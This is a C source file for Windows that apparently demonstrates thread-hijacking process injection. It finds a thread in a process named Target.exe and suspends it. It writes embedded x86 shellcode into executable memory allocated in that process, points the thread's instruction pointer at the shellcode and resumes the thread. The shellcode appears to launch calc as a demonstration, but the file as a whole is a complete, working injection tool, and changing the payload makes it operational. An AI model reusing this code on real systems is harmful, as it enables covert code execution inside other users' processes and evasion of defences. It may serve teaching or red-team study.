#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <tchar.h>

// Some vars
LPWSTR ProcessName = L"Target.exe";
int ThreadId;

// Retrieves PID of process using API calls CreateToolhelp32Snapshot & Process32First & Process32Next
DWORD GetProcessIdByName(LPWSTR name)
{
	PROCESSENTRY32 pe32;
	HANDLE snapshot = NULL;
	DWORD pid = 0;

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE)
	{
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(snapshot, &pe32))
		{
			do
			{
				if (!lstrcmp(pe32.szExeFile, name))
				{
					pid = pe32.th32ProcessID;
					break;
				}
			} while (Process32Next(snapshot, &pe32));
		}
		CloseHandle(snapshot);
	}
	return pid;
}

BOOL SearchForThread(DWORD dwOwnerPID)
{
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;

	// Take a snapshot of all running threads
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
		return(FALSE);

	// Fill in the size of the structure before using it.
	te32.dwSize = sizeof(THREADENTRY32);

	// Retrieve information about the first thread,
	// and exit if unsuccessful
	if (!Thread32First(hThreadSnap, &te32))
	{
		CloseHandle(hThreadSnap);     // Must clean up the snapshot object!
		return(FALSE);
	}

	// Now walk the thread list of the system,
	// and display information about each thread
	// associated with the specified process
	int Found = 0;
	do
	{
		if (te32.th32OwnerProcessID == dwOwnerPID)
		{
			if (Found == 0)
			{
				_tprintf(TEXT("THREAD ID = 0x%08X\n"), te32.th32ThreadID);
				ThreadId = te32.th32ThreadID;
				Found = 1;
			}
		}
	} while (Thread32Next(hThreadSnap, &te32));

	//  Don't forget to clean up the snapshot object.
	CloseHandle(hThreadSnap);
	return(TRUE);
}

int main(int argc, char **argv) {

	int err_cd = 0;
	char *ShellCode = "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xDB\x64\x8B\x7B\x30\x8B\x7F\x0C\x8B\x7F\x1C\x8B\x47\x08\x8B\x77\x20\x8B\x3F\x80\x7E\x0C\x33\x75\xF2\x89\xC7\x03\x78\x3C\x8B\x57\x78\x01\xC2\x8B\x7A\x20\x01\xC7\x89\xDD\x8B\x34\xAF\x01\xC6\x45\x81\x3E\x45\x78\x69\x74\x75\xF2\x81\x7E\x04\x54\x68\x72\x65\x75\xE9\x8B\x7A\x24\x01\xC7\x66\x8B\x2C\x6F\x8B\x7A\x1C\x01\xC7\x8B\x7C\xAF\xFC\x01\xC7\x89\xD9\xB1\xFF\x53\xE2\xFD\x33\xC9\x51\xFF\xD7";


	// Threads List
	printf("Enumerate Threads\n");
	getchar();
	DWORD PID = GetProcessIdByName(ProcessName);
	SearchForThread(PID);
	DWORD TID = (DWORD)ThreadId;
	printf("Target - Process name: %s, Process id: %d, Thread ID %d (0x%08X)\n\n", ProcessName, PID, TID, TID);


	// Getting thread handle
	printf("\nGetting thread handle\n");
	getchar();
	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, TID);
	printf("0x%x \n", hThread);


	// Suspend Thread
	printf("Suspend Thread\n");
	getchar();
	DWORD STID = SuspendThread(hThread);


	// GetContextThread
	printf("GetContextThread\n");
	getchar();
	CONTEXT tCONTEXT;
	tCONTEXT.ContextFlags = CONTEXT_FULL;
	GetThreadContext(hThread, &tCONTEXT);


	// Create Handle 
	printf("Create Handle to process \n");
	getchar();
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, PID);
	if (!hProcess) {
		printf("--> Problem at hProcess \n");
	}
	printf("0x%x\n", hProcess);


	//  Create virtual space
	printf("Create virtual space \n");
	getchar();
	LPVOID pValloc = VirtualAllocEx(hProcess, 0, strlen(ShellCode) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pValloc) {
		printf("--> Problem at pValloc \n");
	}
	printf("0x%x \n", pValloc);


	// Write process Memory
	printf("Write process Memory \n");
	getchar();
	if (!WriteProcessMemory(hProcess, pValloc, ShellCode, strlen(ShellCode) + 1, 0)) {
		printf("--> Problem at WriteProcessMemory \n");
	}
	printf("Wrote shellcode buffer %d \n", strlen(ShellCode));


	// Change therad context
	printf("Change therad context\n");
	getchar();
	printf("Old Thread CONTEXT EIP: 0x%08X \n", tCONTEXT.Eip);
	tCONTEXT.Eip = (DWORD)pValloc;
	printf("New Thread CONTEXT EIP: : 0x%08X \n", tCONTEXT.Eip);


	if (!SetThreadContext(hThread, &tCONTEXT)) {
		err_cd = GetLastError();
		printf("--> Problem at SetThreadContext, Last Error  = %d \n", err_cd);
	}


	// Resume the Thread
	printf("Resume the Thread \n");
	getchar();
	if (!ResumeThread(hThread)) {
		printf("--> Problem at ResumeThread \n");
	}

	printf("Exit.... \n");
	getchar();
	return(0);
}
